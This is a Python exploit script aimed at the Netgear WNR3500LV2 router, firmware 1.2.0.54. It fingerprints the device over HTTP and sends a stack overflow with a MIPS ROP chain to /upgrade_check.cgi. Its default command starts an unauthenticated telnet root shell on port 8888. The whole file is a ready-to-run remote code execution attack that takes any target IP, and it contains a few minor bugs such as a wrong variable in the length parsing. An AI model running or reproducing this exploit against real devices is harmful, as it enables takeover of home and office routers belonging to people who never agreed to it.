import SimpleHTTPServer
import SocketServer
import argparse
import collections
import os
import shutil
import socket
import struct
import sys
import time

##################
## Version Info ##
##################

address_info = {
	"WNR3500LV2" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x80 and calls $t9
		"1.2.0.54" : [0x4456C8, 0x4A6BEC],
	},
}

firmware_version_to_human_version = {
	"WNR3500LV2" : {
		"V1.2.0.54_50.0.94" : "1.2.0.54",
	},
}

default_commands = {
	"WNR3500LV2" : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
}

###############
## Functions ##
###############

def send(ip, port, payload, keep_open = False):
	return send_plain(ip, port, payload, keep_open)

def send_plain(ip, port, payload, keep_open):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	if keep_open:
		return sock
	sock.close()

def p32(address, model):
	return struct.pack("<I", address)

def find_item(contents, start_string):
	start = contents.find(start_string)
	if(start == -1):
		print("Failed to automatically detect version.")
		sys.exit(1)

	start += len(start_string)
	end = contents.find("\r\n", start)
	return contents[start:end].upper() # upper just in case

def detect_model_version(ip, port):
	request = "GET /currentsetting.htm HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip)
	sock = send(ip, port, request, True)

	contents = ""
	while contents.find("InternetConnectionStatus") == -1 and contents.find("401 Unauthorized") == -1 and contents.find("\r\n\r\n") == -1:
		contents += sock.recv(1)

	content_length = -1
	len_start = contents.find("Content-Length: ")
	if len_start != -1:
		content_length_str = find_item(contents, "Content-Length: ")
		if content_length_str.isdigit():
			content_length = int(content_length)

	start_length = len(contents)
	while contents.find("InternetConnectionStatus") == -1 and (content_length == -1 or content_length + start_length < len(contents)):
		contents += sock.recv(1)

	model = find_item(contents, "Model=")
	firmware_version = find_item(contents, "Firmware=")

	return model, firmware_version_to_human_version[model][firmware_version]

####################
## Main Execution ##
####################

def main(args):
	if args.version == "" or args.model == "":
		args.model, args.version = detect_model_version(args.ip, args.port)
		print("Automatically detected model {} and version {}".format(args.model, args.version))

	USING_DEFAULT_COMMAND = (args.command == "START_TELNET")
	if USING_DEFAULT_COMMAND:
		# Resolve the default command (which may be specific to a version)
		args.command = default_commands[args.model]

	# Generate the payload
	rop_gadget = address_info[args.model][args.version]
	if type(rop_gadget) == list:
		rop_gadget = [p32(x, args.model) for x in rop_gadget]
	data = ""
	data += "*#$^\x00" # marker
	data += "\x00\x04\x00" # size
	data += "A" * 0x60

	if args.model == "WNR3500LV2":
		data += "\x00" * 4 # s0
		data += "B" * 0x4  # s1
		data += "C" * 0x4  # s2
		data += "D" * 0x4  # s3
		data += "E" * 0x4  # s4
		data += "F" * 0x4  # s5
		data += "G" * 0x4  # s6
		data += "H" * 0x4  # s7
		data += "I" * 0x4  # fp
		data += rop_gadget[0] # ra
		data += "J" * 0x10 # Padding
		data += "K" * 0x4  # gp
		data += "L" * 0x8C # Padding
		data += "M" * 0x4  # s0
		data += "N" * 0x4  # s1
		data += rop_gadget[1] # ra
		data += "O" * 0x4  # Padding
		data += "P" * 0x80 # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	else:
		print("Unknown model: {}".format(args.model))
		sys.exit(1)

	argument_name = "mtenFWUpload"

	# Send the payload
	payload = ''
	payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
	payload += 'Host: {}\r\n'.format(args.ip)
	payload += 'Content-Disposition: AAAA\r\n'
	payload += 'Content-Length: {}\r\n'.format(len(data))
	payload += 'Content-Type: application/octet-stream\r\n'
	payload += 'name="{}"\r\n'.format(argument_name)
	payload += '\r\n'
	payload += data

	send(args.ip, args.port, payload)
	print("Exploit success, time to eat a Loempia!")

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Run the exploit')
	parser.add_argument('ip', type=str, default=None, help='The IP address of the webserver to exploit')
	parser.add_argument('-command', type=str, default="START_TELNET", help='The command to run; default is to start telnet on port 8888 (or 3333 if 8888 is already used)')
	parser.add_argument('-file', required=False, action='store_true', help='Write the exploit firmware to a file (which typically'
		+ ' has a file extension .chk). Use the ip argument to specify the filename.')
	parser.add_argument('-port', type=int, default=80, help='The port of the webserver to exploit')
	parser.add_argument('-model', type=str, default="", help='The model of the webserver to exploit (default autodetect).'
		+ ' Supported models are: {}'.format(", ".join(address_info.keys())))
	parser.add_argument('-version', type=str, default="", help='The version of the webserver to exploit (default autodetect).'
		+ ' Supported versions are: {}'.format("; ".join(["{}: {}".format(x, ", ".join(address_info[x])) for x in address_info.keys()])))
	args = parser.parse_args()
	args.model = args.model.upper()

	main(args)
